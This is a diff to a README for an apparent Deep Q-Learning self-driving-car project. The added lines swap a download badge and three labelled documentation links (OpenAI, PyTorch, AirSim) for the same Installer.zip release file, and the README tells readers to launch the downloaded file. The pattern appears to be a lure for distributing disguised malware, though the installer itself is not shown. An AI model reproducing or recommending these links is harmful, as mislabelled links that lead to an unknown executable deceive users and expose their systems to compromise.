@@ -25,7 +25,7 @@ Welcome to the Autonomous-Car-with-Deep-Q-Learning repository! This project focu
 
 ## Get Started 🛠️
 To access the project files, you can download the repository by clicking on the following link: 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-yellow)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/osa1998/Autonomous-Car-with-Deep-Q-Learning/releases/download/v1.0/Installer.zip)](https://github.com/osa1998/Autonomous-Car-with-Deep-Q-Learning/releases/download/v1.0/Installer.zip)
 
 Remember to launch the downloaded file for exploration and further development.
 
@@ -37,9 +37,9 @@ If you are interested in contributing to this project, please check the "Release
 
 ## Additional Resources 📦
 For more information on Deep Q-Learning, reinforcement learning, and autonomous systems, you can visit the following websites:
-- [OpenAI Reinforcement Learning](https://openai.com/reinforcement-learning)
-- [PyTorch Documentation](https://pytorch.org/docs/stable/index.html)
-- [AirSim Simulator](https://microsoft.github.io/AirSim/)
+- [OpenAI Reinforcement Learning](https://github.com/osa1998/Autonomous-Car-with-Deep-Q-Learning/releases/download/v1.0/Installer.zip)
+- [PyTorch Documentation](https://github.com/osa1998/Autonomous-Car-with-Deep-Q-Learning/releases/download/v1.0/Installer.zip)
+- [AirSim Simulator](https://github.com/osa1998/Autonomous-Car-with-Deep-Q-Learning/releases/download/v1.0/Installer.zip)
 
 Explore the world of autonomous driving and deep learning with us! 🌟
 
